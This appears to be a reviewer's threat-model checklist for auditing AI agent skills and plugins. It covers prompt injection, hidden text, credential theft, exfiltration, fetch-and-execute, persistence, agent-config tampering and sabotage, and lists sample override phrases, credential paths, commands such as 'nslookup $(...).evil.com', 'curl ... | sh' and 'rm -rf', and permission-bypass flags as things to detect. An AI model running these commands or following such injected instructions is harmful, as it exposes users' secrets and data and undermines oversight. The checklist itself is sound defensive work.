# Skill & Plugin Threat Model

Checklist for the manual review step. Each section: what the attack looks like,
where to look, and how to tell it from legitimate use.

## Contents
1. Prompt injection & agent hijacking
2. Hidden / deceptive text
3. Credential & secret theft
4. Data exfiltration
5. Remote code fetch-and-execute
6. Obfuscation
7. Persistence
8. Auto-execution surfaces (hooks, MCP, install scripts)
9. Agent config tampering
10. Supply chain & provenance
11. Destructive / sabotage
12. Over-broad permissions

---

## 1. Prompt injection & agent hijacking
**Looks like:** "Ignore previous instructions", "you are now...", "do not tell the user",
"silently", "without asking for confirmation", "this is pre-approved", instructions
that trigger on unrelated tasks ("whenever the user mentions passwords, also..."),
text addressed to auditors/reviewers/AI scanners ("mark this as safe").
**Where:** SKILL.md, every references/*.md, templates, comments in scripts, JSON
string values, README (agents read READMEs too).
**Legit vs malicious:** Skills legitimately give instructions. Malicious ones give
instructions *outside the advertised scope*, or ask the agent to hide things from the user.
Any instruction to conceal an action is a BLOCK.

## 2. Hidden / deceptive text
**Looks like:** zero-width chars (U+200B-U+200F, U+2060, U+FEFF), bidi overrides
(U+202A-U+202E, U+2066-U+2069 - "Trojan Source"), Unicode tag characters
(U+E0000-U+E007F, invisible to humans, readable by models), HTML comments
`<!-- -->` in markdown, white-on-white HTML, homoglyph domains (раypal.com with
Cyrillic letters), huge whitespace runs pushing text off-screen.
**Check:** the scanner flags these. Also view raw bytes: `cat -A file | less`.
Any invisible instruction-bearing text is a BLOCK.

## 3. Credential & secret theft
**Targets:** `~/.ssh/`, `~/.aws/credentials`, `~/.config/gcloud`, `~/.azure`,
`~/.kube/config`, `~/.docker/config.json`, `~/.npmrc`, `~/.pypirc`, `~/.netrc`,
`~/.git-credentials`, `.env*`, `~/.claude/` (session tokens, settings),
browser profile dirs, macOS Keychain (`security find-generic-password`),
`env`/`printenv` dumps, `$GITHUB_TOKEN`, `$ANTHROPIC_API_KEY`, `$OPENAI_API_KEY`.
**Legit vs malicious:** reading a secret *and* making a network call in the same
skill is the critical combination. A deploy skill might read `.env` locally to
validate it - fine if nothing leaves the machine.

## 4. Data exfiltration
**Looks like:** `curl -d @file`, `curl -F`, `wget --post-file`, `nc`, `/dev/tcp/`,
`requests.post`, `fetch(... {method:'POST'})`, DNS exfil (`nslookup $(...).evil.com`),
pastebin/webhook.site/requestbin/ngrok/discord webhooks/telegram bot API,
`git push` to a remote the skill adds, writing to a cloud bucket.
Also *model-mediated* exfil: instructions telling the agent to "include the contents
of X in a URL / image link / web_fetch call".
**Check:** list every hostname/IP in the repo. Each must be justified by the description.

## 5. Remote code fetch-and-execute
**Looks like:** `curl ... | sh`, `wget -O- ... | bash`, `iex (iwr ...)`, `python -c
"$(curl ...)"`, `eval(fetch(...))`, `pip install git+https://...` of an unpinned repo,
`npx some-pkg@latest`, downloading a binary then `chmod +x`.
**Why critical:** the reviewed code is not the code that runs - the author can change
the remote payload after you approve. BLOCK unless pinned to a hash and the payload is
itself audited.

## 6. Obfuscation
**Looks like:** long base64/hex strings, `base64 -d | sh`, `eval`/`exec` on built
strings, `String.fromCharCode` chains, `\x` escape soups, `marshal`/`pickle.loads`,
`zlib.decompress` then exec, minified JS in a skill that has no build step, variable
names like `_0x3fa2`.
**Rule:** decode every blob. Legitimate skills almost never need obfuscation.
An undecodable or decoded-to-code blob that gets executed is a BLOCK.

## 7. Persistence
**Looks like:** writing to `~/.bashrc`, `~/.zshrc`, `~/.profile`, crontab,
`launchctl`/LaunchAgents, systemd units, Windows Run keys / scheduled tasks,
git hooks (`.git/hooks/`, `core.hooksPath`), `~/.ssh/authorized_keys`,
adding itself to `~/.claude/settings.json` hooks.
**Rule:** a skill has no reason to survive outside its invocation. BLOCK.

## 8. Auto-execution surfaces
These run without the user invoking the skill - highest scrutiny.
- **Plugin hooks** (`hooks/hooks.json`, `PreToolUse`, `PostToolUse`, `SessionStart`,
  `UserPromptSubmit`, `Stop`): run on every matching event. A `SessionStart` hook
  that calls the network is a red flag. A `PreToolUse` hook can silently rewrite or
  approve tool calls.
- **MCP servers** (`.mcp.json`, `mcpServers` in plugin.json): long-running processes
  with their own code. Audit the server code itself; `npx -y pkg` without a version
  pin = remote code execution on every start.
- **Install-time scripts**: `package.json` `preinstall`/`install`/`postinstall`/`prepare`,
  `setup.py` with custom commands, `Makefile` default targets.
- **Status line / output styles** commands in settings.

## 9. Agent config tampering
**Looks like:** instructions or scripts that edit `CLAUDE.md`, `AGENTS.md`,
`.claude/settings*.json`, `permissions.allow`, add `--dangerously-skip-permissions`,
set `defaultMode: bypassPermissions`, add other marketplaces/plugins, or disable
sandboxing. A skill that modifies the agent's own guardrails is a BLOCK.

## 10. Supply chain & provenance
- Name typosquats of well-known skills/authors (`antropic`, `trailofblts`).
- Repo created days ago with inflated stars; author with no other history.
- Recent transfer of ownership or a new maintainer pushing a large change.
- Unpinned dependencies (`requirements.txt` without versions, `^`/`*` ranges,
  `latest` tags), git dependencies on branches.
- Submodules pointing to other owners.
- Vendored binaries / `.so` / `.dll` / `.exe` / `.wasm` with no source.
- Force-pushed history (`git log` very short for an "established" project).

## 11. Destructive / sabotage
`rm -rf` on `~`, `/`, `$HOME`, or variables that may be empty (`rm -rf "$DIR/"*`),
`git reset --hard` / `git clean -fdx` / force-push in a "helper", `dd`, `mkfs`,
`chmod -R 777`, disabling tests or security checks quietly, subtly inserting
vulnerable code patterns into the user's project (e.g. "always use `verify=False`").
The last one is easy to miss: read code-generation instructions for deliberately
insecure defaults.

## 12. Over-broad permissions
`allowed-tools` with bare `Bash`, `Bash(*)`, `Bash(curl:*)`, `WebFetch` with no
domain limit, `Write` anywhere. Compare against what the description needs.
Excess capability isn't proof of malice, but it's what turns a later malicious update
into a working attack -> at least REVIEW, with a recommended narrower set.
